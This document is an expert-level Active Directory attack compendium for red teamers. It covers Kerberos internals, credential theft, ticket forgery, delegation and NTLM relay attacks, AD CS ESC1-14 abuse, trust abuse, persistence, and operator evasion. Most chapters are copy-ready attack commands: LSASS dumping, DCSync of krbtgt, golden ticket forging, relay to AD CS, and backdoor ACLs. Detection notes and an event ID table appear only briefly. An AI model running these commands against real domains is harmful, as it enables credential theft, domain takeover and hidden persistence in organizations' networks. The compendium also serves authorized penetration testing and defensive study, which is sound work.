# Active Directory Attack Compendium

**Author:** J Laratro — d0sf3t | Aradex.io  
**From Kerberoasting to Cutting-Edge Relay & ESC Attacks**  
*Expert-Level Reference for Red Teamers & Penetration Testers*

---

## Table of Contents

1. [Kerberos Internals & the Attack Surface](#chapter-1-kerberos-internals--the-attack-surface)
2. [Credential Harvesting & Theft](#chapter-2-credential-harvesting--theft)
3. [Kerberoasting & AS-REP Roasting](#chapter-3-kerberoasting--as-rep-roasting)
4. [Pass-the-Hash, Pass-the-Ticket & Overpass-the-Hash](#chapter-4-pass-the-hash-pass-the-ticket--overpass-the-hash)
5. [Golden Tickets, Silver Tickets & Diamond Tickets](#chapter-5-golden-tickets-silver-tickets--diamond-tickets)
6. [Delegation Attacks](#chapter-6-delegation-attacks)
7. [NTLM Relay Attacks & Coercion Techniques](#chapter-7-ntlm-relay-attacks--coercion-techniques)
8. [ACL / ACE Abuse & Object Takeover](#chapter-8-acl--ace-abuse--object-takeover)
9. [AD Certificate Services — ESC1 through ESC14](#chapter-9-ad-certificate-services--esc1-through-esc14)
10. [Trust Abuse & Cross-Forest Attacks](#chapter-10-trust-abuse--cross-forest-attacks)
11. [Persistence & Domain Dominance](#chapter-11-persistence--domain-dominance)
12. [Defensive Evasion & OPSEC](#chapter-12-defensive-evasion--opsec-for-operators)
13. [Detection Engineering & Blue Team Indicators](#chapter-13-detection-engineering--blue-team-indicators)
14. [Tool Reference Matrix](#chapter-14-tool-reference-matrix)
15. [AD Security Assessment Checklist](#ad-penetration-testing--security-assessment-checklist)

---

## Chapter 1: Kerberos Internals & the Attack Surface

Kerberos is the default authentication protocol in Active Directory since Windows 2000. Every major AD attack class — Kerberoasting, Golden/Silver Tickets, delegation abuse, S4U abuse — exploits specific design decisions in the protocol.

### 1.1 The Three-Party Model

Kerberos involves three parties: (1) the **Client** requesting access, (2) the **Key Distribution Center (KDC)** running on every Domain Controller (consisting of the Authentication Service and Ticket Granting Service), and (3) the **Application Server** (target service). The client never sends its password over the network — it proves knowledge through encrypted timestamps and receives time-limited tickets.

### 1.2 Authentication Flow

#### AS-REQ / AS-REP (Initial Authentication)

The client sends an AS-REQ containing: the user principal name, a timestamp encrypted with the user's NT hash (pre-authentication data), and a request for a TGT. The KDC validates the encrypted timestamp, then returns an AS-REP containing: (a) a TGT encrypted with the **krbtgt** account's NT hash (the client cannot decrypt this), and (b) a session key encrypted with the user's NT hash.

> **Operator Tip:** If pre-authentication is disabled on an account (DONT_REQ_PREAUTH, UAC 4194304), the KDC returns an AS-REP without verifying identity. The encrypted portion can be cracked offline — this is **AS-REP Roasting**.

#### TGS-REQ / TGS-REP (Service Ticket Request)

The client presents its TGT to the KDC along with the SPN of the target service. The KDC decrypts the TGT with the krbtgt hash, validates the session, and returns a TGS encrypted with the **target service account's NT hash**. Critically, the KDC does not verify authorization — any authenticated user can request a TGS for any SPN. Authorization is delegated to the service.

> **Operator Tip:** Since any user can request a TGS for any SPN, and the TGS is encrypted with the service account's hash, any TGS for an SPN mapped to a **user account** (not a machine account) can be cracked offline. This is **Kerberoasting**.

#### AP-REQ / AP-REP (Service Authentication)

The client presents the Service Ticket to the target service. The service decrypts it with its own NT hash, extracts the PAC containing group memberships and SIDs, and makes an authorization decision. The service does **not** contact the DC to validate the ticket by default — it trusts the ticket's contents. This is why Silver Tickets work.

### 1.3 The PAC (Privilege Attribute Certificate)

The PAC is embedded in every Kerberos ticket containing: SID, group SIDs, logon information, and claims. Signed by both the KDC (krbtgt key) and the target service's key. PAC validation was historically optional. Microsoft has incrementally enforced it since 2021 (KB5008380, KB5020009, KB5037754), but rollouts are slow and many environments remain vulnerable.

> **Detection:** Event ID 4769 (TGS request) logs the SPN and encryption type. Event ID 4768 (TGT request) logs the pre-auth type. RC4 (etype 23) in an AES environment indicates potential Kerberoasting or legacy misconfiguration.

### 1.4 Encryption Types

| Etype | Algorithm | Key Derivation | Attack Relevance |
|-------|-----------|---------------|-----------------|
| 23 (RC4-HMAC) | RC4 with MD4 NT hash | NT hash = MD4(UTF-16LE(password)) | Fastest to crack. No salt. Default Kerberoast target. |
| 17 (AES128) | AES-128 PBKDF2 | 4096 iterations + salt (domain+username) | Slower to crack. Salted. |
| 18 (AES256) | AES-256 PBKDF2 | 4096 iterations + salt | Slowest. Preferred in hardened environments. |

> **Operator Tip:** When Kerberoasting, force RC4 by requesting etype 23 in TGS-REQ. Rubeus supports this with /tgtdeleg or /enctype flags. AES tickets take significantly longer to crack but aren't immune if passwords are weak.

### 1.5 Key Accounts

The **krbtgt** account's NT hash encrypts every TGT in the domain. Compromising it grants Golden Ticket capability — forged TGTs for any user with arbitrary group memberships and up to 10-year lifetimes. The krbtgt password is set at domain creation and almost never rotated.

**Machine accounts** (ending in $) have auto-generated 240-character random passwords rotating every 30 days. Their hashes can't be cracked but can be extracted from the machine (SAM, LSASS, registry) for Silver Ticket attacks.

---

## Chapter 2: Credential Harvesting & Theft

Credential theft is the foundation of AD lateral movement. Credentials exist across the environment in multiple forms: NT hashes in LSASS, Kerberos tickets in memory, cached domain credentials, cleartext in GPP, and the full domain database (NTDS.dit) on DCs.

### 2.1 LSASS Credential Extraction

LSASS (lsass.exe) caches authentication material for SSO: NT hashes, Kerberos TGTs/session keys, cleartext passwords (if WDigest enabled — default on Server 2008 R2 and earlier), and DPAPI master keys.

**Mimikatz sekurlsa::logonpasswords** — Classic approach. Requires SeDebugPrivilege (local admin). On systems with Credential Guard, LSASS runs in VBS isolation and Mimikatz can't read it.

**LSASS Minidump** — Dump via procdump, comsvcs.dll (`rundll32 comsvcs.dll MiniDump`), or Task Manager, then parse offline with Mimikatz or pypykatz.

**nanodump / PPLdump / PPLmedic** — Bypass PPL protection on LSASS. nanodump uses direct syscalls to evade EDR. PPLmedic exploits BYOVDLL to downgrade LSASS protection.

**SAM / SYSTEM / SECURITY Hives** — Offline extraction of local NT hashes. Tools: reg save, secretsdump.py (local), Volume Shadow Copy.

> **OPSEC Warning:** Touching LSASS is the most detected offensive action. Most EDRs hook NtReadVirtualMemory on LSASS. Consider DCSync, Kerberos ticket theft, or DPAPI abuse first.

### 2.2 NTDS.dit Extraction

The domain database on every DC at `C:\Windows\NTDS\NTDS.dit`. Contains all user NT hashes and Kerberos keys. Locked by AD — can't be copied directly.

- **Volume Shadow Copy** — `vssadmin create shadow /for=C:` then copy from shadow. Requires local admin on DC.
- **ntdsutil** — `ntdsutil "activate instance ntds" ifm "create full C:\temp"` creates IFM backup.
- **DCSync** — Uses DRS protocol to replicate password data remotely. No filesystem access needed.
- **Offline parsing** — `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`, or DSInternals.

### 2.3 GPP Passwords

Prior to MS14-025, GPP stored AES-256 encrypted passwords in XML on SYSVOL. Microsoft published the key on MSDN, making decryption trivial. Tools: `gpp-decrypt`, `Get-GPPPassword`, NetExec `gpp_password` module. Old GPP files may persist.

### 2.4 DPAPI Secrets

DPAPI protects browser passwords, Wi-Fi keys, RDP creds, cert private keys. Master keys encrypted with user's password hash. Domain DPAPI backup keys (extractable via `lsadump::backupkeys` or `secretsdump.py`) decrypt any domain user's DPAPI secrets without individual passwords.

### 2.5 Kerberos Ticket Extraction

Tickets can be extracted without touching LSASS password storage. `Rubeus dump` exports tickets from current session. `Rubeus triage` lists all sessions (requires elevation). Cross-platform with `ticketConverter.py`.

---

## Chapter 3: Kerberoasting & AS-REP Roasting

### 3.1 Kerberoasting — Theory

Any authenticated domain user can request a TGS for any SPN. The TGS is encrypted with the service account's NT hash. For **user accounts** with SPNs (not machine accounts with 240-char passwords), the ticket can be cracked offline. This is the single most commonly successful AD attack on engagements.

### 3.2 Kerberoasting — Execution

```bash
# Enumerate Kerberoastable accounts
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1
Rubeus.exe kerberoast /stats

# Request tickets (force RC4 for faster cracking)
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 -request -outputfile hashes.txt
Rubeus.exe kerberoast /enctype:rc4 /outfile:hashes.txt

# Crack
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule  # RC4
hashcat -m 19700 hashes.txt wordlist.txt                        # AES
```

> **OPSEC Warning:** Requesting many TGS tickets rapidly is detectable. Target high-value accounts only. Use /tgtdeleg in Rubeus to avoid NTLM artifacts.

> **Detection:** Event ID 4769 for TGS requests with etype 0x17 (RC4) in AES environments. Volume anomalies from a single source. MDI flags Kerberoasting natively.

### 3.3 Targeted Kerberoasting

With GenericAll, GenericWrite, or WriteProperty on a user, you can **set an SPN** on that account, request a TGS, crack it, then remove the SPN.

```powershell
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='http/fake'}
Rubeus.exe kerberoast /user:targetuser
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

### 3.4 AS-REP Roasting

Targets accounts with DONT_REQ_PREAUTH (UAC 4194304). Without pre-auth, the KDC returns an AS-REP encrypted with the user's key — crackable offline. **Does not require valid domain credentials** if you know the username.

```bash
# Authenticated enumeration
Get-DomainUser -PreauthNotRequired

# Unauthenticated (username spray)
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1

# Crack (hashcat mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

**Targeted AS-REP Roasting:** With Write permissions, enable DONT_REQ_PREAUTH, grab the AS-REP, crack, then re-enable pre-auth.

---

## Chapter 4: Pass-the-Hash, Pass-the-Ticket & Overpass-the-Hash

### 4.1 Pass-the-Hash (PtH)

NTLM's challenge-response uses the NT hash directly: `response = HMAC-MD5(NT_hash, server_challenge + client_challenge)`. The hash *is* the credential.

```bash
# Impacket
psexec.py domain/user@target -hashes :NT_HASH
wmiexec.py domain/user@target -hashes :NT_HASH
smbexec.py domain/user@target -hashes :NT_HASH

# NetExec
nxc smb 10.10.10.0/24 -u admin -H NT_HASH --local-auth

# Mimikatz
sekurlsa::pth /user:admin /domain:corp.local /ntlm:NT_HASH /run:cmd.exe
```

**PtH targets:** SMB, WMI, WinRM, LDAP, MSSQL — any NTLM-accepting service. RDP only works with Restricted Admin Mode enabled.

> **OPSEC Warning:** PtH over SMB with service creation (psexec-style) is extremely noisy. Prefer wmiexec (no service, in-memory) or DCOM for stealth.

### 4.2 Overpass-the-Hash (Pass-the-Key)

Uses an NT hash (or AES key) to request a legitimate Kerberos TGT, converting NTLM creds to Kerberos.

```bash
# Rubeus
Rubeus.exe asktgt /user:admin /rc4:NT_HASH /ptt
Rubeus.exe asktgt /user:admin /aes256:AES_KEY /ptt /opsec  # stealthier

# Impacket
getTGT.py domain.local/admin -hashes :NT_HASH
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass domain.local/admin@dc01.domain.local
```

### 4.3 Pass-the-Ticket (PtT)

Injects a stolen Kerberos ticket (TGT or TGS) into the current logon session. Uses the ticket directly — no hash needed.

```bash
Rubeus.exe dump /luid:0x3e7 /service:krbtgt
Rubeus.exe ptt /ticket:base64_ticket
kerberos::ptt ticket.kirbi  # Mimikatz
```

---

## Chapter 5: Golden Tickets, Silver Tickets & Diamond Tickets

### 5.1 Golden Ticket

A forged TGT created with the **krbtgt** NT hash. Any username (even non-existent), any group memberships (DA, EA), any ticket lifetime (up to 10 years), any SID History.

#### DCSync → Golden Ticket

```bash
# DCSync
lsadump::dcsync /domain:corp.local /user:krbtgt
secretsdump.py corp.local/admin:pass@dc01 -just-dc-user krbtgt

# Forge Golden Ticket
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
Rubeus.exe golden /rc4:KRBTGT_HASH /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /ptt
```

| Property | Value | Detection Opportunity |
|----------|-------|----------------------|
| Lifetime | Forged: up to 10 years | TGTs exceeding domain policy (default 10 hrs) |
| Account | Can be non-existent | TGT for user not in AD (if PAC validation enforced) |
| Groups | Arbitrary | Unexpected group memberships in PAC |
| Encryption | RC4 or AES256 | RC4 in AES-only environment |

> **Detection:** Event ID 4769 with no prior 4768 (TGS without TGT request). RC4 TGTs when AES enforced. Abnormal TGT lifetimes. MDI detects Golden Tickets natively.

### 5.2 Silver Ticket

A forged TGS created with the target service account's NT hash. **Never contacts the KDC** — no AS-REQ or TGS-REQ generated on the DC.

**Common targets:** CIFS (file shares), HOST (scheduled tasks, psexec), HTTP (WinRM), LDAP (DCSync via forged LDAP ticket to DC), MSSQL.

```bash
kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /target:server01.corp.local /service:cifs /rc4:MACHINE_HASH /ptt
```

> **OPSEC Warning:** Silver Tickets bypass DC logging entirely. Only detection is on the target service. If PAC validation is enforced, the forged PAC is rejected.

### 5.3 Diamond Ticket

A modification of a **legitimately issued TGT**. Decrypt a real TGT with the krbtgt hash, modify the PAC (add privileged group SIDs), re-encrypt. Has matching AS-REQ logs — much harder to detect.

```bash
Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:normaluser /password:pass /enctype:aes256 /ticketuser:admin /ticketuserid:500 /groups:512 /ptt
```

---

## Chapter 6: Delegation Attacks

Kerberos delegation allows a service to impersonate a user when accessing other services on their behalf. Each delegation type introduces specific abuse paths.

### 6.1 Unconstrained Delegation

When a computer has the TrustedForDelegation flag, any user who authenticates via Kerberos has their **TGT cached** in the computer's LSASS.

```bash
# Find unconstrained delegation hosts
Get-DomainComputer -Unconstrained | select dnshostname

# Monitor for TGTs
Rubeus.exe monitor /interval:5 /nowrap

# Coerce DC (PrinterBug)
SpoolSample.exe dc01.corp.local unconstrained01.corp.local

# PetitPotam (unauthenticated when unpatched)
PetitPotam.py unconstrained01.corp.local dc01.corp.local

# Use captured DC TGT for DCSync
Rubeus.exe ptt /ticket:base64_dc_tgt
lsadump::dcsync /domain:corp.local /user:krbtgt
```

### 6.2 Constrained Delegation

Limits delegation to specific services listed in **msDS-AllowedToDelegateTo**. Uses S4U extensions.

```bash
# Impacket
getST.py -spn cifs/target01.corp.local -impersonate Administrator corp.local/svc_web:pass
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target01.corp.local

# Rubeus
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target01.corp.local /ptt
```

> **Operator Tip:** The SPN in msDS-AllowedToDelegateTo only controls the service class. You can rewrite the service name: HTTP/server → CIFS/server, HOST/server. This is **SPN rewriting**.

### 6.3 Resource-Based Constrained Delegation (RBCD)

The **target service** lists who can delegate to it via **msDS-AllowedToActOnBehalfOfOtherIdentity**. Writable by anyone with Write privileges on the target computer object.

```bash
# Create machine account (default MAQ = 10)
addcomputer.py -computer-name FAKEPC$ -computer-pass Password1 corp.local/user:pass

# Set RBCD
rbcd.py -delegate-to TARGET$ -delegate-from FAKEPC$ -dc-ip 10.10.10.1 corp.local/user:pass

# S4U to get DA ticket
getST.py -spn cifs/target.corp.local -impersonate Administrator -dc-ip 10.10.10.1 corp.local/FAKEPC$:Password1

# Use it
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.corp.local
```

> **Detection:** Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity (Event ID 5136). Also monitor new machine accounts (4741) combined with delegation config changes.

---

## Chapter 7: NTLM Relay Attacks & Coercion Techniques

NTLM relay exploits NTLM's lack of mutual authentication and channel binding. An attacker intercepts NTLM authentication and forwards it to a different target, authenticating as the victim.

### 7.1 What Makes Relay Possible

- **No SMB signing** — Not enforced by default on non-DC members
- **No LDAP signing / channel binding** — Rarely enforced
- **No EPA** (Extended Protection for Authentication) — Required for HTTP/HTTPS protection
- **Cross-protocol relay** — NTLM from SMB can relay to LDAP, HTTP, MSSQL, and vice versa

### 7.2 Coercion Techniques

| Technique | Protocol | Auth Required | Impact |
|-----------|----------|--------------|--------|
| PetitPotam | MS-EFSR | Unauth (unpatched) | Coerce DC via HTTP/SMB |
| PrinterBug (SpoolSample) | MS-RPRN | Authenticated | Coerce any host with Print Spooler |
| DFSCoerce | MS-DFSNM | Authenticated | Coerce via DFS namespace mgmt |
| ShadowCoerce | MS-FSRVP | Authenticated | Coerce via File Server VSS Agent |
| Coercer | Multiple (17+ methods) | Authenticated | Automated multi-protocol coercion framework. Preferred tool. |

### 7.3 High-Impact Relay Scenarios

**Relay to LDAP → RBCD:**
```bash
ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access
PetitPotam.py attacker_ip target_ip
```

**Relay to AD CS HTTP Enrollment (ESC8):**
```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py attacker_ip dc01.corp.local
Rubeus.exe asktgt /user:dc01$ /certificate:base64_cert /ptt
```

**Relay to SMB:**
```bash
ntlmrelayx.py -t smb://target01.corp.local -smb2support
```

### 7.4 LLMNR / NBT-NS / mDNS Poisoning

```bash
responder -I eth0 -wrFb
hashcat -m 5600 hashes.txt wordlist.txt
```

> **Operator Tip:** Combine Responder (capture) with ntlmrelayx (relay) simultaneously. Use -A (analyze mode) first.

### 7.5 Kerberos Relay (Emerging)

Kerberos relay abuses Kerberos authentication forwarding where AP-REQ is not channel-bound. Implementations exist for DNS Dynamic Updates, LLMNR, and DCOM-based relay. Bypasses NTLM-specific defenses like SMB/LDAP signing. Increasingly relevant as Microsoft deprecates NTLM.

### 7.6 WebClient + Coercion (HTTP Relay Path)

If WebClient service is running, coercion forces HTTP-based auth instead of SMB. HTTP auth is not subject to SMB signing, enabling relay to LDAP for RBCD or Shadow Credentials. Enumerate with `nxc smb targets -u user -p pass -M webdav`. One of the most reliable modern relay paths.

---

## Chapter 8: ACL / ACE Abuse & Object Takeover

Every AD object has a DACL with ACEs defining who can do what. Overly permissive ACEs are among the most common and impactful AD misconfigurations. BloodHound maps these as attack graph edges.

### 8.1 Dangerous ACE Rights

| Right | Abuse |
|-------|-------|
| GenericAll | Full control: change password, modify group membership, set SPN, write any attribute |
| GenericWrite | Set SPN (targeted Kerberoast), modify RBCD attribute, Shadow Credentials |
| WriteDACL | Grant yourself GenericAll. Self-escalation primitive. |
| WriteOwner | Take ownership, then modify DACL to grant GenericAll |
| ForceChangePassword | Reset user's password without knowing current. Disruptive but effective. |
| AddMember / Self | Add self/controlled user to privileged groups |
| AllExtendedRights | ForceChangePassword + read LAPS password + read gMSA password |
| DS-Replication-Get-Changes-All | DCSync — replicate password data from DC |

### 8.2 ACL Attack Chains

```powershell
# Grant DCSync rights via WriteDACL
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity attacker -Rights DCSync

# Add to group
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'

# Force password reset
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force)
```

### 8.3 Shadow Credentials (msDS-KeyCredentialLink)

With GenericWrite/GenericAll on a user or computer, add a Key Credential to msDS-KeyCredentialLink. Obtain a TGT via PKINIT without changing the password.

```bash
# Whisker (C#)
Whisker.exe add /target:targetuser /domain:corp.local
Rubeus.exe asktgt /user:targetuser /certificate:generated.pfx /password:pfx_pass /ptt

# pyWhisker (Python)
pywhisker.py -d corp.local -u attacker -p pass -t targetuser --action add
```

> **Detection:** Monitor msDS-KeyCredentialLink modifications (Event ID 5136). PKINIT auth (Event ID 4768, pre-auth type 16) from accounts that don't normally use certificates.

---

## Chapter 9: AD Certificate Services — ESC1 through ESC14

AD CS provides PKI for AD environments. SpecterOps (2021) and community research identified 14+ escalation vectors. AD CS attacks are among the most impactful because **certificates persist independently of password resets**.

### 9.1 Enumeration

```bash
Certify.exe find /vulnerable
certipy find -u user@corp.local -p pass -dc-ip 10.10.10.1 -vulnerable
```

### 9.2 ESC1: SAN Specification

Most common. Vulnerable when: (1) **ENROLLEE_SUPPLIES_SUBJECT** enabled, (2) authentication EKU, (3) attacker has enrollment rights. Request a cert specifying a DA's UPN as the SAN.

```bash
certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### 9.3 ESC2: Any Purpose EKU / No EKU

Templates with Any Purpose EKU (OID 2.5.29.37.0), subordinate CA EKU, or no EKU can be used for authentication.

### 9.4 ESC3: Enrollment Agent

Two-step: (1) Enroll in template granting Certificate Request Agent EKU. (2) Use it to request a cert on behalf of another user.

### 9.5 ESC4: Vulnerable Template ACLs

WriteDACL/WriteOwner/WriteProperty on template AD object → modify to enable ENROLLEE_SUPPLIES_SUBJECT + auth EKU → exploit as ESC1.

```bash
certipy template -u user@corp.local -p pass -template Target -save-old
certipy req -u user@corp.local -p pass -ca CORP-CA -template Target -upn administrator@corp.local
certipy template -u user@corp.local -p pass -template Target -configuration Target.json  # restore
```

### 9.6 ESC5: PKI Object ACLs

Write access to CA's AD object, RootCA, or NTAuthCertificates container. Modify NTAuthCertificates to add a rogue CA.

### 9.7 ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

If CA has this flag, **any** cert request can include arbitrary SAN. Every auth-enabled template becomes ESC1. Patched May 2022.

### 9.8 ESC7: Vulnerable CA ACLs

**ManageCA** rights: enable EDITF flag, add yourself as officer. **ManageCertificates**: approve pending requests.

```bash
certipy ca -ca CORP-CA -u user@corp.local -p pass -add-officer user
certipy req -u user@corp.local -p pass -ca CORP-CA -template SubCA -upn administrator@corp.local
certipy ca -ca CORP-CA -u user@corp.local -p pass -issue-request [ID]
certipy req -u user@corp.local -p pass -ca CORP-CA -retrieve [ID]
```

### 9.9 ESC8: NTLM Relay to HTTP Enrollment

AD CS web enrollment accepts NTLM over HTTP by default with no EPA. Relay DC machine auth to request a DC certificate. See Chapter 7.

### 9.10 ESC9: No Security Extension

CT_FLAG_NO_SECURITY_EXTENSION flag → cert lacks account mapping extension. Combined with StrongCertificateBindingEnforcement = 0 or 1: UPN swap attack.

### 9.11 ESC10: Weak Certificate Mapping

**ESC10a:** StrongCertificateBindingEnforcement = 0 → certs mapped by UPN only.  
**ESC10b:** CertificateMappingMethods includes UPN mapping (0x4).

### 9.12 ESC11: Relay to ICertPassage (RPC)

Relay NTLM to CA's RPC enrollment interface. Same impact as ESC8 via RPC.

### 9.13 ESC12: CA Key in DPAPI

CA private key stored via DPAPI (software, not HSM). Local admin on CA → recover key → issue certs offline.

### 9.14 ESC13: OID Group Link

Templates with issuance policy OID linked to AD group via msDS-OIDToGroupLink. Enrollment grants effective group membership.

### 9.15 ESC14: Explicit Certificate Mapping

Exploits altSecurityIdentities attribute. Write access → map your cert to target's account.

> **Operator Tip:** AD CS certs persist through password resets. For persistence, request long-lived certs. Compromising the CA's private key = forge certs offline indefinitely.

---

## Chapter 10: Trust Abuse & Cross-Forest Attacks

### 10.1 Trust Types

| Trust Type | Direction | SID Filtering | Attack Relevance |
|-----------|-----------|--------------|-----------------|
| Parent-Child | Two-way | Disabled | Full SID History abuse within forest |
| Tree-Root | Two-way | Disabled | Same as parent-child |
| Forest (default) | Configurable | Enabled | SID filtering blocks SID History |
| Forest (SID History) | Configurable | Disabled | Critical — full cross-forest SID History abuse |
| External | Configurable | Enabled | Limited scope |

### 10.2 Child → Parent Escalation

Forge Golden Ticket with Enterprise Admins SID in SIDHistory. SID filtering is disabled on parent-child trusts.

```bash
lsadump::dcsync /domain:child.corp.local /user:krbtgt
kerberos::golden /user:fakeadmin /domain:child.corp.local /sid:S-1-5-21-CHILD /krbtgt:HASH /sids:S-1-5-21-ROOT-519 /ptt
```

### 10.3 Cross-Forest Attacks

With SID filtering enabled, remaining paths: Kerberoasting across trusts, shared credentials, AD CS cross-trust abuse, foreign group membership, SID filtering disabled (/enablesidhistory).

---

## Chapter 11: Persistence & Domain Dominance

### 11.1 Persistence Matrix

| Technique | Access Needed | Survives PW Reset | Detect Difficulty |
|-----------|--------------|-------------------|-------------------|
| Golden Ticket | krbtgt hash | Yes (all but krbtgt) | Medium |
| Silver Ticket | Service hash | No (that acct) | Hard |
| Diamond Ticket | krbtgt hash | Yes | Hard |
| DCSync Backdoor ACL | WriteDACL on domain | Yes | Medium |
| AdminSDHolder | DA / WriteDACL | Yes | Medium |
| DCShadow | DA + SYSTEM on DC | Yes | Very Hard |
| AD CS Certificate | Enrollment rights | Yes (independent) | Hard |
| Skeleton Key | DA / SYSTEM on DC | Yes (No reboot) | Medium |
| DSRM Abuse | DA / local DC admin | Yes | Hard |
| GPO Backdoor | GPO edit rights | Yes | Medium |
| Custom SSP | SYSTEM on DC | Yes | Hard |
| SID History | DA / SID write | Yes | Medium |

### 11.2 AdminSDHolder Persistence

AdminSDHolder's ACL is stamped onto all protected groups every 60 minutes by SDProp. Add a backdoor ACE → auto-propagates to DA, EA, Schema Admins.

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity backdoor -Rights All
```

### 11.3 DCShadow

Registers a rogue DC, pushes malicious replication, then unregisters. Changes appear as normal directory replication. Requires DA + SYSTEM.

### 11.4 Skeleton Key

Patches LSASS on DC — any user auths with master password ('mimikatz') alongside real password. Doesn't survive reboot.

### 11.5 Certificate-Based Persistence

Request long-lived certs for privileged accounts. Valid regardless of password changes. Compromise CA private key for indefinite offline cert forging.

### 11.6 Custom SSP / Password Filter

Register custom SSP DLL on DC. Receives plaintext passwords during every authentication.

---

## Chapter 12: Defensive Evasion & OPSEC for Operators

### 12.1 Ticket OPSEC
- **Use AES256 keys** over RC4 when forging. RC4 in AES environments = red flag.
- **Match ticket lifetimes** to domain policy.
- **Diamond Tickets over Golden** when possible.
- **S4U2Self targets** should be plausible users.

### 12.2 Credential Access OPSEC
- **Avoid LSASS** directly. Prefer DCSync, ticket extraction, DPAPI abuse.
- **If LSASS required**, use direct syscalls (nanodump).
- **Remote LSASS dump** via comsvcs.dll or WerFault crash dumping.

### 12.3 Lateral Movement OPSEC
- **Kerberos over NTLM** — Overpass-the-Hash converts hashes to tickets.
- **WMI / DCOM over SMB** — psexec is the most detected lateral movement.
- **Use existing admin tools** — WinRM, PS Remoting, SCCM.

### 12.4 Enumeration OPSEC
- **Pace LDAP queries** — SharpHound --Throttle or run during business hours.
- **Target specific OUs** instead of full dumps.

### 12.5 AD CS OPSEC
- **Request certs for plausible accounts**.
- **Restore modified templates immediately** (certipy --save-old).
- **CA logs** (4886/4887) often not forwarded to SIEM.

---

## Chapter 13: Detection Engineering & Blue Team Indicators

### 13.1 Critical Event IDs

| Event ID | Source | Description | Attacks Detected |
|----------|--------|-------------|-----------------|
| 4768 | Security (DC) | TGT requested | AS-REP Roast, Overpass-the-Hash |
| 4769 | Security (DC) | TGS requested | Kerberoast, Golden Ticket |
| 4771 | Security (DC) | Pre-auth failed | Password spraying |
| 4724/4723 | Security (DC) | Password reset/change | ForceChangePassword |
| 4741 | Security (DC) | Computer account created | RBCD setup |
| 5136 | Dir Service | Object modified | ACL changes, RBCD, Shadow Creds |
| 4662 | Security (DC) | Directory object operation | DCSync |
| 4886/4887 | CA | Cert requested/issued | AD CS (ESC1-14) |

### 13.2 Recommended Audit Policies
- **Directory Service Changes auditing** — Event ID 5136
- **Kerberos Service Ticket Operations** — 4769 for Kerberoasting
- **Forward CA logs to SIEM** — 4886/4887
- **PowerShell Script Block Logging**
- **Process creation with command line** (4688)

---

## Chapter 14: Tool Reference Matrix

### 14.1 Offensive Tooling

| Tool | Lang | Primary Use Cases |
|------|------|-------------------|
| Mimikatz | C | Credential extraction, ticket forging, DCSync, DCShadow, Skeleton Key, PtH, DPAPI |
| Rubeus | C# | Kerberoast, AS-REP Roast, asktgt, S4U, ticket manipulation, Diamond Tickets |
| Impacket | Python | psexec/wmiexec/smbexec, secretsdump, GetUserSPNs, ntlmrelayx, getST |
| BloodHound CE | C#/JS | AD attack path mapping. Community Edition with Cypher queries and API |
| Certipy | Python | AD CS enumeration and exploitation (ESC1-14) |
| NetExec (nxc) | Python | Network-wide credential testing. Successor to CrackMapExec (deprecated) |
| Responder | Python | LLMNR/NBT-NS/mDNS poisoning, NTLM hash capture |
| Coercer | Python | Automated multi-protocol coercion (17+ methods) |
| lsassy | Python | Remote LSASS credential extraction with multiple dump methods |
| Whisker / pyWhisker | C#/Py | Shadow Credentials: add/list/remove Key Credentials |
| nanodump | C | Stealthy LSASS minidump using direct syscalls |

### 14.2 Hashcat Modes

| Mode | Hash Type | Source |
|------|-----------|--------|
| 1000 | NTLM (NT hash) | SAM, NTDS.dit, LSASS |
| 5600 | NTLMv2 | Responder capture |
| 13100 | Kerberos TGS-REP (RC4) | Kerberoasting |
| 19700 | Kerberos TGS-REP (AES) | Kerberoasting (AES) |
| 18200 | Kerberos AS-REP | AS-REP Roasting |

### 14.3 Key LDAP Filters

| Target | LDAP Filter |
|--------|-------------|
| All users | `(&(objectClass=user)(objectCategory=person))` |
| Kerberoastable | `(&(servicePrincipalName=*)(objectCategory=person)(!(objectClass=computer)))` |
| AS-REP Roastable | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` |
| Domain Controllers | `(userAccountControl:1.2.840.113556.1.4.803:=8192)` |
| Unconstrained Delegation | `(userAccountControl:1.2.840.113556.1.4.803:=524288)` |
| Constrained Delegation | `(msDS-AllowedToDelegateTo=*)` |
| RBCD Configured | `(msDS-AllowedToActOnBehalfOfOtherIdentity=*)` |
| LAPS (Legacy) | `(ms-Mcs-AdmPwdExpirationTime=*)` |
| LAPS v2 (Windows LAPS) | `(msLAPS-PasswordExpirationTime=*)` |
| AdminCount=1 | `(adminCount=1)` |

---

## AD Penetration Testing — Security Assessment Checklist

### Phase 1: Reconnaissance & Enumeration

- [ ] Identify all Domain Controllers (DNS SRV records, LDAP, nslookup)
- [ ] Enumerate domain/forest functional level
